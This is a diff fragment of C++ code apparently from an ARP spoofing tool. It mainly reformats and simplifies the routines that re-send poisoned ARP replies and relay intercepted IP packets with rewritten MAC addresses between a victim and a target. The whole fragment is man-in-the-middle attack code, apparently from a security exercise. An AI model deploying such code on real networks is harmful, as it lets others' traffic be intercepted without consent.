@@ -34,7 +34,8 @@ namespace arpspoof {
             if (res == 0) continue;
             ArpPacket pk(packet);
 
-            if (pk.arp.opcode == ARPOP_REQUEST and pk.arp.sender_ip == session.sender.second and pk.arp.target_ip == session.target.second) {
+            if (pk.arp.opcode == ARPOP_REQUEST and
+                pk.arp.sender_ip == session.sender.second and pk.arp.target_ip == session.target.second) {
                 cnt = 3;
                 while (cnt--) {
                     send_arp(desc);
@@ -48,7 +49,7 @@ namespace arpspoof {
         pcap *desc = open_dev(device.c_str());
         while (true) {
             try {
-                this->send_arp(desc);
+                send_arp(desc);
                 boost::this_thread::sleep_for(boost::chrono::seconds(period));
             } catch (const runtime_error &ex) {
                 cerr << ex.what() << endl;
@@ -77,16 +78,13 @@ namespace arpspoof {
             if (res == 0) continue;
             IpPacket pk(packet);
 
-
-            if (pk.eth.type == ETHERTYPE_IP and pk.eth.src == session.sender.first) {
+            if (pk.eth.type == ETHERTYPE_IP and
+                pk.eth.src == session.sender.first) {
                 pk.eth.src = dev_mac;
                 pk.eth.dst = session.target.first;
 
-                bytes data = pk.to_bytes();
-                data.insert(data.end(), packet + pk.eth.size() + pk.ip.header_size(), packet + pk.eth.size() + pk.ip.size());
-//                cout << pk.size() << ", " << data.size() << endl;
                 cout << pk.ip.src << " -> " << pk.ip.dst << endl;
-                if (pcap_sendpacket(desc, data.data(), data.size()) != 0) {
+                if (pcap_sendpacket(desc, pk.to_bytes().data(), pk.size()) != 0) {
                     cout << "Error sending the packet : " + string(pcap_geterr(desc)) << endl;
                 }
             }
